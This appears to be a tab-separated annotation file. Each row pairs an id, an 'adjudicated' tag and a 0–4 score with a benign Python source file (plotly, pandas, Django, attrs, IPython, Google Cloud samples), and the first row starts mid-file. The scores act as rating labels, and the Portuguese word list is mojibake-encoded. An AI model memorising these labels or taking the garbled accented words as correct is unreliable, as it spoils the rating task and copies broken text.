""""""<<NEWL>>    Ensure entry points are unique by group and name and validate each.<<NEWL>>    """"""<<NEWL>>    consume(map(ensure_valid, ensure_unique(eps, key=by_group_and_name)))<<NEWL>>    return eps<<NEWL>><<NEWL>><<NEWL>>@functools.singledispatch<<NEWL>>def load(eps):<<NEWL>>    """"""<<NEWL>>    Given a Distribution.entry_points, produce EntryPoints.<<NEWL>>    """"""<<NEWL>>    groups = itertools.chain.from_iterable(<<NEWL>>        load_group(value, group)<<NEWL>>        for group, value in eps.items())<<NEWL>>    return validate(metadata.EntryPoints(groups))<<NEWL>><<NEWL>><<NEWL>>@load.register(str)<<NEWL>>def _(eps):<<NEWL>>    r""""""<<NEWL>>    >>> ep, = load('[console_scripts]\nfoo=bar')<<NEWL>>    >>> ep.group<<NEWL>>    'console_scripts'<<NEWL>>    >>> ep.name<<NEWL>>    'foo'<<NEWL>>    >>> ep.value<<NEWL>>    'bar'<<NEWL>>    """"""<<NEWL>>    return validate(metadata.EntryPoints(metadata.EntryPoints._from_text(eps)))<<NEWL>><<NEWL>><<NEWL>>load.register(type(None), lambda x: x)<<NEWL>><<NEWL>><<NEWL>>@pass_none<<NEWL>>def render(eps: metadata.EntryPoints):<<NEWL>>    by_group = operator.attrgetter('group')<<NEWL>>    groups = itertools.groupby(sorted(eps, key=by_group), by_group)<<NEWL>><<NEWL>>    return '\n'.join(<<NEWL>>        f'[{group}]\n{render_items(items)}\n'<<NEWL>>        for group, items in groups<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def render_items(eps):<<NEWL>>    return '\n'.join(<<NEWL>>        f'{ep.name} = {ep.value}'<<NEWL>>        for ep in sorted(eps)<<NEWL>>    )"
275	adjudicated	1	"import pytest<<NEWL>>from traitlets import HasTraits, TraitError<<NEWL>>from traitlets.utils.importstring import import_item<<NEWL>><<NEWL>>from notebook.traittypes import (<<NEWL>>    InstanceFromClasses,<<NEWL>>    TypeFromClasses<<NEWL>>)<<NEWL>>from notebook.services.contents.largefilemanager import LargeFileManager<<NEWL>><<NEWL>><<NEWL>>class DummyClass:<<NEWL>>    """"""Dummy class for testing Instance""""""<<NEWL>><<NEWL>><<NEWL>>class DummyInt(int):<<NEWL>>    """"""Dummy class for testing types.""""""<<NEWL>><<NEWL>><<NEWL>>class Thing(HasTraits):<<NEWL>><<NEWL>>    a = InstanceFromClasses(<<NEWL>>        default_value=2,<<NEWL>>        klasses=[<<NEWL>>            int,<<NEWL>>            str,<<NEWL>>            DummyClass,<<NEWL>>        ]<<NEWL>>    )<<NEWL>><<NEWL>>    b = TypeFromClasses(<<NEWL>>        default_value=None,<<NEWL>>        allow_none=True,<<NEWL>>        klasses=[<<NEWL>>            DummyClass,<<NEWL>>            int,<<NEWL>>            'notebook.services.contents.manager.ContentsManager'<<NEWL>>        ]<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>class TestInstanceFromClasses:<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [1, 'test', DummyClass()]<<NEWL>>    )<<NEWL>>    def test_good_values(self, value):<<NEWL>>        thing = Thing(a=value)<<NEWL>>        assert thing.a == value<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [2.4, object()]<<NEWL>>    )<<NEWL>>    def test_bad_values(self, value):<<NEWL>>        with pytest.raises(TraitError) as e:<<NEWL>>            thing = Thing(a=value)<<NEWL>><<NEWL>><<NEWL>>class TestTypeFromClasses:<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [DummyClass, DummyInt, LargeFileManager,<<NEWL>>            'notebook.services.contents.manager.ContentsManager']<<NEWL>>    )<<NEWL>>    def test_good_values(self, value):<<NEWL>>        thing = Thing(b=value)<<NEWL>>        if isinstance(value, str):<<NEWL>>            value = import_item(value)<<NEWL>>        assert thing.b == value<<NEWL>><<NEWL>>    @pytest.mark.parametrize(<<NEWL>>        'value',<<NEWL>>        [float, object]<<NEWL>>    )<<NEWL>>    def test_bad_values(self, value):<<NEWL>>        with pytest.raises(TraitError) as e:<<NEWL>>            thing = Thing(b=value)"
57	adjudicated	3	"# Copyright 2016 Google Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>""""""<<NEWL>>Sample Google App Engine application that demonstrates using the Users API<<NEWL>><<NEWL>>For more information about App Engine, see README.md under /appengine.<<NEWL>>""""""<<NEWL>><<NEWL>># [START all]<<NEWL>><<NEWL>>from google.appengine.api import users<<NEWL>>import webapp2<<NEWL>><<NEWL>><<NEWL>>class MainPage(webapp2.RequestHandler):<<NEWL>>    def get(self):<<NEWL>>        # [START user_details]<<NEWL>>        user = users.get_current_user()<<NEWL>>        if user:<<NEWL>>            nickname = user.nickname()<<NEWL>>            logout_url = users.create_logout_url('/')<<NEWL>>            greeting = 'Welcome, {}! (<a href=""{}"">sign out</a>)'.format(<<NEWL>>                nickname, logout_url)<<NEWL>>        else:<<NEWL>>            login_url = users.create_login_url('/')<<NEWL>>            greeting = '<a href=""{}"">Sign in</a>'.format(login_url)<<NEWL>>        # [END user_details]<<NEWL>>        self.response.write(<<NEWL>>            '<html><body>{}</body></html>'.format(greeting))<<NEWL>><<NEWL>><<NEWL>>class AdminPage(webapp2.RequestHandler):<<NEWL>>    def get(self):<<NEWL>>        user = users.get_current_user()<<NEWL>>        if user:<<NEWL>>            if users.is_current_user_admin():<<NEWL>>                self.response.write('You are an administrator.')<<NEWL>>            else:<<NEWL>>                self.response.write('You are not an administrator.')<<NEWL>>        else:<<NEWL>>            self.response.write('You are not logged in.')<<NEWL>><<NEWL>><<NEWL>>app = webapp2.WSGIApplication([<<NEWL>>    ('/', MainPage),<<NEWL>>    ('/admin', AdminPage)<<NEWL>>], debug=True)<<NEWL>><<NEWL>># [END all]"
117	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scatterternary"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
286	adjudicated	4	"""""""<<NEWL>>Behavioral based tests for offsets and date_range.<<NEWL>><<NEWL>>This file is adapted from https://github.com/pandas-dev/pandas/pull/18761 -<<NEWL>>which was more ambitious but less idiomatic in its use of Hypothesis.<<NEWL>><<NEWL>>You may wish to consult the previous version for inspiration on further<<NEWL>>tests, or when trying to pin down the bugs exposed by the tests below.<<NEWL>>""""""<<NEWL>>from hypothesis import (<<NEWL>>    assume,<<NEWL>>    given,<<NEWL>>)<<NEWL>>import pytest<<NEWL>>import pytz<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>from pandas._testing._hypothesis import (<<NEWL>>    DATETIME_JAN_1_1900_OPTIONAL_TZ,<<NEWL>>    YQM_OFFSET,<<NEWL>>)<<NEWL>><<NEWL>># ----------------------------------------------------------------<<NEWL>># Offset-specific behaviour tests<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.arm_slow<<NEWL>>@given(DATETIME_JAN_1_1900_OPTIONAL_TZ, YQM_OFFSET)<<NEWL>>def test_on_offset_implementations(dt, offset):<<NEWL>>    assume(not offset.normalize)<<NEWL>>    # check that the class-specific implementations of is_on_offset match<<NEWL>>    # the general case definition:<<NEWL>>    #   (dt + offset) - offset == dt<<NEWL>>    try:<<NEWL>>        compare = (dt + offset) - offset<<NEWL>>    except (pytz.NonExistentTimeError, pytz.AmbiguousTimeError):<<NEWL>>        # When dt + offset does not exist or is DST-ambiguous, assume(False) to<<NEWL>>        # indicate to hypothesis that this is not a valid test case<<NEWL>>        # DST-ambiguous example (GH41906):<<NEWL>>        # dt = datetime.datetime(1900, 1, 1, tzinfo=pytz.timezone('Africa/Kinshasa'))<<NEWL>>        # offset = MonthBegin(66)<<NEWL>>        assume(False)<<NEWL>><<NEWL>>    assert offset.is_on_offset(dt) == (compare == dt)<<NEWL>><<NEWL>><<NEWL>>@given(YQM_OFFSET)<<NEWL>>def test_shift_across_dst(offset):<<NEWL>>    # GH#18319 check that 1) timezone is correctly normalized and<<NEWL>>    # 2) that hour is not incorrectly changed by this normalization<<NEWL>>    assume(not offset.normalize)<<NEWL>><<NEWL>>    # Note that dti includes a transition across DST boundary<<NEWL>>    dti = pd.date_range(<<NEWL>>        start=""2017-10-30 12:00:00"", end=""2017-11-06"", freq=""D"", tz=""US/Eastern""<<NEWL>>    )<<NEWL>>    assert (dti.hour == 12).all()  # we haven't screwed up yet<<NEWL>><<NEWL>>    res = dti + offset<<NEWL>>    assert (res.hour == 12).all()"
6	adjudicated	0	"import sys<<NEWL>>from typing import TYPE_CHECKING<<NEWL>><<NEWL>>if sys.version_info < (3, 7) or TYPE_CHECKING:<<NEWL>>    from ._ysrc import YsrcValidator<<NEWL>>    from ._y import YValidator<<NEWL>>    from ._xsrc import XsrcValidator<<NEWL>>    from ._x import XValidator<<NEWL>>    from ._thickness import ThicknessValidator<<NEWL>>    from ._pad import PadValidator<<NEWL>>    from ._line import LineValidator<<NEWL>>    from ._labelsrc import LabelsrcValidator<<NEWL>>    from ._label import LabelValidator<<NEWL>>    from ._hovertemplatesrc import HovertemplatesrcValidator<<NEWL>>    from ._hovertemplate import HovertemplateValidator<<NEWL>>    from ._hoverlabel import HoverlabelValidator<<NEWL>>    from ._hoverinfo import HoverinfoValidator<<NEWL>>    from ._groups import GroupsValidator<<NEWL>>    from ._customdatasrc import CustomdatasrcValidator<<NEWL>>    from ._customdata import CustomdataValidator<<NEWL>>    from ._colorsrc import ColorsrcValidator<<NEWL>>    from ._color import ColorValidator<<NEWL>>else:<<NEWL>>    from _plotly_utils.importers import relative_import<<NEWL>><<NEWL>>    __all__, __getattr__, __dir__ = relative_import(<<NEWL>>        __name__,<<NEWL>>        [],<<NEWL>>        [<<NEWL>>            ""._ysrc.YsrcValidator"",<<NEWL>>            ""._y.YValidator"",<<NEWL>>            ""._xsrc.XsrcValidator"",<<NEWL>>            ""._x.XValidator"",<<NEWL>>            ""._thickness.ThicknessValidator"",<<NEWL>>            ""._pad.PadValidator"",<<NEWL>>            ""._line.LineValidator"",<<NEWL>>            ""._labelsrc.LabelsrcValidator"",<<NEWL>>            ""._label.LabelValidator"",<<NEWL>>            ""._hovertemplatesrc.HovertemplatesrcValidator"",<<NEWL>>            ""._hovertemplate.HovertemplateValidator"",<<NEWL>>            ""._hoverlabel.HoverlabelValidator"",<<NEWL>>            ""._hoverinfo.HoverinfoValidator"",<<NEWL>>            ""._groups.GroupsValidator"",<<NEWL>>            ""._customdatasrc.CustomdatasrcValidator"",<<NEWL>>            ""._customdata.CustomdataValidator"",<<NEWL>>            ""._colorsrc.ColorsrcValidator"",<<NEWL>>            ""._color.ColorValidator"",<<NEWL>>        ],<<NEWL>>    )"
397	adjudicated	2	"import tempfile, os<<NEWL>>from pathlib import Path<<NEWL>><<NEWL>>from traitlets.config.loader import Config<<NEWL>><<NEWL>><<NEWL>>def setup_module():<<NEWL>>    ip.magic('load_ext storemagic')<<NEWL>><<NEWL>>def test_store_restore():<<NEWL>>    assert 'bar' not in ip.user_ns, ""Error: some other test leaked `bar` in user_ns""<<NEWL>>    assert 'foo' not in ip.user_ns, ""Error: some other test leaked `foo` in user_ns""<<NEWL>>    assert 'foobar' not in ip.user_ns, ""Error: some other test leaked `foobar` in user_ns""<<NEWL>>    assert 'foobaz' not in ip.user_ns, ""Error: some other test leaked `foobaz` in user_ns""<<NEWL>>    ip.user_ns['foo'] = 78<<NEWL>>    ip.magic('alias bar echo ""hello""')<<NEWL>>    ip.user_ns['foobar'] = 79<<NEWL>>    ip.user_ns['foobaz'] = '80'<<NEWL>>    tmpd = tempfile.mkdtemp()<<NEWL>>    ip.magic('cd ' + tmpd)<<NEWL>>    ip.magic('store foo')<<NEWL>>    ip.magic('store bar')<<NEWL>>    ip.magic('store foobar foobaz')<<NEWL>><<NEWL>>    # Check storing<<NEWL>>    assert ip.db[""autorestore/foo""] == 78<<NEWL>>    assert ""bar"" in ip.db[""stored_aliases""]<<NEWL>>    assert ip.db[""autorestore/foobar""] == 79<<NEWL>>    assert ip.db[""autorestore/foobaz""] == ""80""<<NEWL>><<NEWL>>    # Remove those items<<NEWL>>    ip.user_ns.pop('foo', None)<<NEWL>>    ip.user_ns.pop('foobar', None)<<NEWL>>    ip.user_ns.pop('foobaz', None)<<NEWL>>    ip.alias_manager.undefine_alias('bar')<<NEWL>>    ip.magic('cd -')<<NEWL>>    ip.user_ns['_dh'][:] = []<<NEWL>><<NEWL>>    # Check restoring<<NEWL>>    ip.magic(""store -r foo bar foobar foobaz"")<<NEWL>>    assert ip.user_ns[""foo""] == 78<<NEWL>>    assert ip.alias_manager.is_alias(""bar"")<<NEWL>>    assert ip.user_ns[""foobar""] == 79<<NEWL>>    assert ip.user_ns[""foobaz""] == ""80""<<NEWL>><<NEWL>>    ip.magic(""store -r"")  # restores _dh too<<NEWL>>    assert any(Path(tmpd).samefile(p) for p in ip.user_ns[""_dh""])<<NEWL>><<NEWL>>    os.rmdir(tmpd)<<NEWL>><<NEWL>>def test_autorestore():<<NEWL>>    ip.user_ns['foo'] = 95<<NEWL>>    ip.magic('store foo')<<NEWL>>    del ip.user_ns['foo']<<NEWL>>    c = Config()<<NEWL>>    c.StoreMagics.autorestore = False<<NEWL>>    orig_config = ip.config<<NEWL>>    try:<<NEWL>>        ip.config = c<<NEWL>>        ip.extension_manager.reload_extension(""storemagic"")<<NEWL>>        assert ""foo"" not in ip.user_ns<<NEWL>>        c.StoreMagics.autorestore = True<<NEWL>>        ip.extension_manager.reload_extension(""storemagic"")<<NEWL>>        assert ip.user_ns[""foo""] == 95<<NEWL>>    finally:<<NEWL>>        ip.config = orig_config"
146	adjudicated	3	"""""""<<NEWL>>Simple console example that echos the input converted to uppercase.<<NEWL>>""""""<<NEWL>><<NEWL>>import sys<<NEWL>>import asyncio<<NEWL>><<NEWL>>from typing import Callable<<NEWL>><<NEWL>>from bacpypes3.settings import settings<<NEWL>>from bacpypes3.debugging import bacpypes_debugging, ModuleLogger<<NEWL>>from bacpypes3.argparse import ArgumentParser<<NEWL>>from bacpypes3.console import Console, ConsolePDU<<NEWL>>from bacpypes3.comm import Server, bind<<NEWL>><<NEWL>># some debugging<<NEWL>>_debug = 0<<NEWL>>_log = ModuleLogger(globals())<<NEWL>><<NEWL>><<NEWL>>@bacpypes_debugging<<NEWL>>class Echo(Server[ConsolePDU]):<<NEWL>>    """"""<<NEWL>>    This example server echos downstream strings as uppercase strings going<<NEWL>>    upstream.  If the PDU is None the console is finished, and this could send<<NEWL>>    an integer status code upstream to exit.<<NEWL>>    """"""<<NEWL>><<NEWL>>    _debug: Callable[..., None]<<NEWL>><<NEWL>>    async def indication(self, pdu: ConsolePDU) -> None:<<NEWL>>        """"""<<NEWL>>        This function is called with each line of text from the console (or<<NEWL>>        from a file or pipe) and called with None at end-of-file.  It is<<NEWL>>        ""downstream"" of the Console() instance and gets this ""indication"" when<<NEWL>>        the console is making a ""request"".<<NEWL>>        """"""<<NEWL>>        if _debug:<<NEWL>>            Echo._debug(""indication {!r}"".format(pdu))<<NEWL>>        if pdu is None:<<NEWL>>            return<<NEWL>><<NEWL>>        # send the uppercase content back up the stack<<NEWL>>        await self.response(pdu.upper())<<NEWL>><<NEWL>><<NEWL>>async def main() -> None:<<NEWL>>    try:<<NEWL>>        console = None<<NEWL>>        args = ArgumentParser().parse_args()<<NEWL>>        if _debug:<<NEWL>>            _log.debug(""args: %r"", args)<<NEWL>>            _log.debug(""settings: %r"", settings)<<NEWL>><<NEWL>>        # build a very small stack<<NEWL>>        console = Console()<<NEWL>>        echo = Echo()<<NEWL>>        if _debug:<<NEWL>>            _log.debug(""console, echo: %r, %r"", console, echo)<<NEWL>><<NEWL>>        # bind the two objects together, top down<<NEWL>>        bind(console, echo)<<NEWL>><<NEWL>>        # run until the console is done, canceled or EOF<<NEWL>>        await console.fini.wait()<<NEWL>><<NEWL>>    finally:<<NEWL>>        if console and console.exit_status:<<NEWL>>            sys.exit(console.exit_status)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    asyncio.run(main())"
488	adjudicated	0	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>><<NEWL>>from ...attrs import LIKE_NUM<<NEWL>><<NEWL>><<NEWL>>_num_words = [<<NEWL>>    ""zero"",<<NEWL>>    ""um"",<<NEWL>>    ""dois"",<<NEWL>>    ""trÃªs"",<<NEWL>>    ""tres"",<<NEWL>>    ""quatro"",<<NEWL>>    ""cinco"",<<NEWL>>    ""seis"",<<NEWL>>    ""sete"",<<NEWL>>    ""oito"",<<NEWL>>    ""nove"",<<NEWL>>    ""dez"",<<NEWL>>    ""onze"",<<NEWL>>    ""doze"",<<NEWL>>    ""dÃºzia"",<<NEWL>>    ""dÃºzias"",<<NEWL>>    ""duzia"",<<NEWL>>    ""duzias"",<<NEWL>>    ""treze"",<<NEWL>>    ""catorze"",<<NEWL>>    ""quinze"",<<NEWL>>    ""dezasseis"",<<NEWL>>    ""dezassete"",<<NEWL>>    ""dezoito"",<<NEWL>>    ""dezanove"",<<NEWL>>    ""vinte"",<<NEWL>>    ""trinta"",<<NEWL>>    ""quarenta"",<<NEWL>>    ""cinquenta"",<<NEWL>>    ""sessenta"",<<NEWL>>    ""setenta"",<<NEWL>>    ""oitenta"",<<NEWL>>    ""noventa"",<<NEWL>>    ""cem"",<<NEWL>>    ""cento"",<<NEWL>>    ""duzentos"",<<NEWL>>    ""trezentos"",<<NEWL>>    ""quatrocentos"",<<NEWL>>    ""quinhentos"",<<NEWL>>    ""seicentos"",<<NEWL>>    ""setecentos"",<<NEWL>>    ""oitocentos"",<<NEWL>>    ""novecentos"",<<NEWL>>    ""mil"",<<NEWL>>    ""milhÃ£o"",<<NEWL>>    ""milhao"",<<NEWL>>    ""milhÃµes"",<<NEWL>>    ""milhoes"",<<NEWL>>    ""bilhÃ£o"",<<NEWL>>    ""bilhao"",<<NEWL>>    ""bilhÃµes"",<<NEWL>>    ""bilhoes"",<<NEWL>>    ""trilhÃ£o"",<<NEWL>>    ""trilhao"",<<NEWL>>    ""trilhÃµes"",<<NEWL>>    ""trilhoes"",<<NEWL>>    ""quadrilhÃ£o"",<<NEWL>>    ""quadrilhao"",<<NEWL>>    ""quadrilhÃµes"",<<NEWL>>    ""quadrilhoes"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>_ordinal_words = [<<NEWL>>    ""primeiro"",<<NEWL>>    ""segundo"",<<NEWL>>    ""terceiro"",<<NEWL>>    ""quarto"",<<NEWL>>    ""quinto"",<<NEWL>>    ""sexto"",<<NEWL>>    ""sÃ©timo"",<<NEWL>>    ""oitavo"",<<NEWL>>    ""nono"",<<NEWL>>    ""dÃ©cimo"",<<NEWL>>    ""vigÃ©simo"",<<NEWL>>    ""trigÃ©simo"",<<NEWL>>    ""quadragÃ©simo"",<<NEWL>>    ""quinquagÃ©simo"",<<NEWL>>    ""sexagÃ©simo"",<<NEWL>>    ""septuagÃ©simo"",<<NEWL>>    ""octogÃ©simo"",<<NEWL>>    ""nonagÃ©simo"",<<NEWL>>    ""centÃ©simo"",<<NEWL>>    ""ducentÃ©simo"",<<NEWL>>    ""trecentÃ©simo"",<<NEWL>>    ""quadringentÃ©simo"",<<NEWL>>    ""quingentÃ©simo"",<<NEWL>>    ""sexcentÃ©simo"",<<NEWL>>    ""septingentÃ©simo"",<<NEWL>>    ""octingentÃ©simo"",<<NEWL>>    ""nongentÃ©simo"",<<NEWL>>    ""milÃ©simo"",<<NEWL>>    ""milionÃ©simo"",<<NEWL>>    ""bilionÃ©simo"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>def like_num(text):<<NEWL>>    if text.startswith((""+"", ""-"", ""Â±"", ""~"")):<<NEWL>>        text = text[1:]<<NEWL>>    text = text.replace("","", """").replace(""."", """").replace(""Âº"", """").replace(""Âª"", """")<<NEWL>>    if text.isdigit():<<NEWL>>        return True<<NEWL>>    if text.count(""/"") == 1:<<NEWL>>        num, denom = text.split(""/"")<<NEWL>>        if num.isdigit() and denom.isdigit():<<NEWL>>            return True<<NEWL>>    if text.lower() in _num_words:<<NEWL>>        return True<<NEWL>>    if text.lower() in _ordinal_words:<<NEWL>>        return True<<NEWL>>    return False<<NEWL>><<NEWL>><<NEWL>>LEX_ATTRS = {LIKE_NUM: like_num}"
498	adjudicated	2	"from django.conf import settings<<NEWL>>from django.core import checks<<NEWL>>from django.core.exceptions import FieldDoesNotExist<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class CurrentSiteManager(models.Manager):<<NEWL>>    ""Use this to limit objects to those associated with the current site.""<<NEWL>><<NEWL>>    use_in_migrations = True<<NEWL>><<NEWL>>    def __init__(self, field_name=None):<<NEWL>>        super().__init__()<<NEWL>>        self.__field_name = field_name<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_field_name())<<NEWL>>        return errors<<NEWL>><<NEWL>>    def _check_field_name(self):<<NEWL>>        field_name = self._get_field_name()<<NEWL>>        try:<<NEWL>>            field = self.model._meta.get_field(field_name)<<NEWL>>        except FieldDoesNotExist:<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager could not find a field named '%s'."" % field_name,<<NEWL>>                    obj=self,<<NEWL>>                    id='sites.E001',<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):<<NEWL>>            return [<<NEWL>>                checks.Error(<<NEWL>>                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key or a many-to-many field."" % (<<NEWL>>                        self.model._meta.object_name, field_name<<NEWL>>                    ),<<NEWL>>                    obj=self,<<NEWL>>                    id='sites.E002',<<NEWL>>                )<<NEWL>>            ]<<NEWL>><<NEWL>>        return []<<NEWL>><<NEWL>>    def _get_field_name(self):<<NEWL>>        """""" Return self.__field_name or 'site' or 'sites'. """"""<<NEWL>><<NEWL>>        if not self.__field_name:<<NEWL>>            try:<<NEWL>>                self.model._meta.get_field('site')<<NEWL>>            except FieldDoesNotExist:<<NEWL>>                self.__field_name = 'sites'<<NEWL>>            else:<<NEWL>>                self.__field_name = 'site'<<NEWL>>        return self.__field_name<<NEWL>><<NEWL>>    def get_queryset(self):<<NEWL>>        return super().get_queryset().filter(**{self._get_field_name() + '__id': settings.SITE_ID})"
156	adjudicated	3	"# SPDX-License-Identifier: MIT<<NEWL>><<NEWL>><<NEWL>>class FrozenError(AttributeError):<<NEWL>>    """"""<<NEWL>>    A frozen/immutable instance or attribute have been attempted to be<<NEWL>>    modified.<<NEWL>><<NEWL>>    It mirrors the behavior of ``namedtuples`` by using the same error message<<NEWL>>    and subclassing `AttributeError`.<<NEWL>><<NEWL>>    .. versionadded:: 20.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    msg = ""can't set attribute""<<NEWL>>    args = [msg]<<NEWL>><<NEWL>><<NEWL>>class FrozenInstanceError(FrozenError):<<NEWL>>    """"""<<NEWL>>    A frozen instance has been attempted to be modified.<<NEWL>><<NEWL>>    .. versionadded:: 16.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class FrozenAttributeError(FrozenError):<<NEWL>>    """"""<<NEWL>>    A frozen attribute has been attempted to be modified.<<NEWL>><<NEWL>>    .. versionadded:: 20.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class AttrsAttributeNotFoundError(ValueError):<<NEWL>>    """"""<<NEWL>>    An ``attrs`` function couldn't find an attribute that the user asked for.<<NEWL>><<NEWL>>    .. versionadded:: 16.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class NotAnAttrsClassError(ValueError):<<NEWL>>    """"""<<NEWL>>    A non-``attrs`` class has been passed into an ``attrs`` function.<<NEWL>><<NEWL>>    .. versionadded:: 16.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class DefaultAlreadySetError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    A default has been set using ``attr.ib()`` and is attempted to be reset<<NEWL>>    using the decorator.<<NEWL>><<NEWL>>    .. versionadded:: 17.1.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class UnannotatedAttributeError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type<<NEWL>>    annotation.<<NEWL>><<NEWL>>    .. versionadded:: 17.3.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class PythonTooOldError(RuntimeError):<<NEWL>>    """"""<<NEWL>>    It was attempted to use an ``attrs`` feature that requires a newer Python<<NEWL>>    version.<<NEWL>><<NEWL>>    .. versionadded:: 18.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class NotCallableError(TypeError):<<NEWL>>    """"""<<NEWL>>    A ``attr.ib()`` requiring a callable has been set with a value<<NEWL>>    that is not callable.<<NEWL>><<NEWL>>    .. versionadded:: 19.2.0<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, msg, value):<<NEWL>>        super(TypeError, self).__init__(msg, value)<<NEWL>>        self.msg = msg<<NEWL>>        self.value = value<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return str(self.msg)"
387	adjudicated	2	"# Copyright 2022 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>># [START speech_quickstart_v2]<<NEWL>>import io<<NEWL>><<NEWL>>from google.cloud.speech_v2 import SpeechClient<<NEWL>>from google.cloud.speech_v2.types import cloud_speech<<NEWL>><<NEWL>><<NEWL>>def quickstart_v2(project_id, recognizer_id, audio_file):<<NEWL>>    # Instantiates a client<<NEWL>>    client = SpeechClient()<<NEWL>><<NEWL>>    request = cloud_speech.CreateRecognizerRequest(<<NEWL>>        parent=f""projects/{project_id}/locations/global"",<<NEWL>>        recognizer_id=recognizer_id,<<NEWL>>        recognizer=cloud_speech.Recognizer(<<NEWL>>            language_codes=[""en-US""], model=""latest_long""<<NEWL>>        ),<<NEWL>>    )<<NEWL>><<NEWL>>    # Creates a Recognizer<<NEWL>>    operation = client.create_recognizer(request=request)<<NEWL>>    recognizer = operation.result()<<NEWL>><<NEWL>>    # Reads a file as bytes<<NEWL>>    with io.open(audio_file, ""rb"") as f:<<NEWL>>        content = f.read()<<NEWL>><<NEWL>>    config = cloud_speech.RecognitionConfig(auto_decoding_config={})<<NEWL>><<NEWL>>    request = cloud_speech.RecognizeRequest(<<NEWL>>        recognizer=recognizer.name, config=config, content=content<<NEWL>>    )<<NEWL>><<NEWL>>    # Transcribes the audio into text<<NEWL>>    response = client.recognize(request=request)<<NEWL>><<NEWL>>    for result in response.results:<<NEWL>>        print(""Transcript: {}"".format(result.alternatives[0].transcript))<<NEWL>><<NEWL>>    return response<<NEWL>><<NEWL>><<NEWL>># [END speech_quickstart_v2]<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    quickstart_v2()"
